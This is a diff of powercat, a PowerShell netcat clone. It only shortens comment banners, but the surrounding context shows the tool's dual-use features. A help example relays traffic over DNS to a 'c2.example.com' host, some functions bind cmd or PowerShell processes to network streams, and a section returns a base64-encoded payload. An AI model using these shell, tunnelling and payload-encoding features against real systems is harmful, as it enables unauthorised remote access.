@@ -21,7 +21,7 @@ function powercat
     [alias("Help")][switch]$h=$False
   )
   
-  ############### HELP ###############
+  ############ HELP ############
   $Help = "
 powercat - Netcat, The Powershell Version
 Github Repository: https://github.com/besimorhino/powercat
@@ -119,9 +119,9 @@ Examples:
       powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
 "
   if($h){return $Help}
-  ############### HELP ###############
+  ############ HELP ############
   
-  ############### VALIDATE ARGS ###############
+  ############ VALIDATE ARGS ############
   $global:Verbose = $Verbose
   if($of -ne ''){$o = 'Bytes'}
   if($dns -eq "")
@@ -146,9 +146,9 @@ Examples:
       if($Failure){break}
     }
   }
-  ############### VALIDATE ARGS ###############
+  ############ VALIDATE ARGS ############
   
-  ############### UDP FUNCTIONS ###############
+  ############ UDP FUNCTIONS ############
   function Setup_UDP
   {
     param($FuncSetupVars)
@@ -242,9 +242,9 @@ Examples:
     param($FuncVars)
     $FuncVars["Socket"].Close()
   }
-  ############### UDP FUNCTIONS ###############
+  ############ UDP FUNCTIONS ############
   
-  ############### DNS FUNCTIONS ###############
+  ############ DNS FUNCTIONS ############
   function Setup_DNS
   {
     param($FuncSetupVars)
@@ -421,9 +421,9 @@ Examples:
     $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
     Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
   }
-  ############### DNS FUNCTIONS ###############
+  ############ DNS FUNCTIONS ############
   
-  ########## TCP FUNCTIONS ##########
+  ######## TCP FUNCTIONS ########
   function Setup_TCP
   {
     param($FuncSetupVars)
@@ -530,9 +530,9 @@ Examples:
     if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
     else{$FuncVars["Socket"].Close()}
   }
-  ########## TCP FUNCTIONS ##########
+  ######## TCP FUNCTIONS ########
   
-  ########## CMD FUNCTIONS ##########
+  ######## CMD FUNCTIONS ########
   function Setup_CMD
   {
     param($FuncSetupVars)
@@ -585,9 +585,9 @@ Examples:
     param($FuncVars)
     $FuncVars["Process"] | Stop-Process
   }  
-  ########## CMD FUNCTIONS ##########
+  ######## CMD FUNCTIONS ########
   
-  ########## POWERSHELL FUNCTIONS ##########
+  ######## POWERSHELL FUNCTIONS ########
   function Main_Powershell
   {
     param($Stream1SetupVars)   
@@ -635,7 +635,7 @@ Examples:
       {        
         try
         {
-          ##### Stream2 Read #####
+          #### Stream2 Read ####
           $Prompt = $null
           $ReturnedData = $null
           if($CommandToExecute -ne "")
@@ -649,7 +649,7 @@ Examples:
           $Data += $ReturnedData
           $Data += $Prompt
           $CommandToExecute = ""
-          ##### Stream2 Read #####
+          #### Stream2 Read ####
 
           if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
           $Data = $null
@@ -685,9 +685,9 @@ Examples:
       }
     }
   }
-  ########## POWERSHELL FUNCTIONS ##########
+  ######## POWERSHELL FUNCTIONS ########
 
-  ########## CONSOLE FUNCTIONS ##########
+  ######## CONSOLE FUNCTIONS ########
   function Setup_Console
   {
     param($FuncSetupVars)
@@ -726,9 +726,9 @@ Examples:
     elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
     return
   }
-  ########## CONSOLE FUNCTIONS ##########
+  ######## CONSOLE FUNCTIONS ########
   
-  ########## MAIN FUNCTION ##########
+  ######## MAIN FUNCTION ########
   function Main
   {
     param($Stream1SetupVars,$Stream2SetupVars)
@@ -814,9 +814,9 @@ Examples:
       }
     }
   }
-  ########## MAIN FUNCTION ##########
+  ######## MAIN FUNCTION ########
   
-  ########## GENERATE PAYLOAD ##########
+  ######## GENERATE PAYLOAD ########
   if($u)
   {
     Write-Verbose "Set Stream 1: UDP"
@@ -911,14 +911,14 @@ Examples:
   if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
   else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
   $InvokeString = ($FunctionString + $InvokeString)
-  ########## GENERATE PAYLOAD ##########
+  ######## GENERATE PAYLOAD ########
   
-  ########## RETURN GENERATED PAYLOADS ##########
+  ######## RETURN GENERATED PAYLOADS ########
   if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
   elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
-  ########## RETURN GENERATED PAYLOADS ##########
+  ######## RETURN GENERATED PAYLOADS ########
   
-  ########## EXECUTION ##########
+  ######## EXECUTION ########
   $Output = $null
   try
   {
@@ -944,5 +944,5 @@ Examples:
       else{[io.file]::WriteAllBytes($of,$Output)}
     }
   }
-  ########## EXECUTION ##########
+  ######## EXECUTION ########
 }
